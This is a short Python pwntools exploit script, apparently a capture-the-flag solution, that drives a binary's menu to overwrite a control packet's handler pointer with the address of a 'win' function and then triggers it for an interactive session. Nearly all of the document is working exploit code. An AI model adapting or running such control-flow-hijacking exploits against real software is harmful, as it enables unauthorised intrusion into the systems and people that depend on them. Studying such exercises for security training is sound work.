#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = b"A" * 8  + p64(exe.sym.win)


    # Creates Data packet
    r.sendlineafter("> ", "1")
    r.sendlineafter("): ", "0")

    # Edit this data packet with the win function address at the offset of handler() at ControlPacket (+8)
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", "0")
    r.sendlineafter("): ", payload)

    # Upgrades the data packet to be a control packet
    r.sendlineafter("> ", "3")
    r.sendlineafter(": ", "0")

    # Process the control packet
    r.sendlineafter("> ", "4")
    r.sendlineafter(": ", "0")
    
    

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
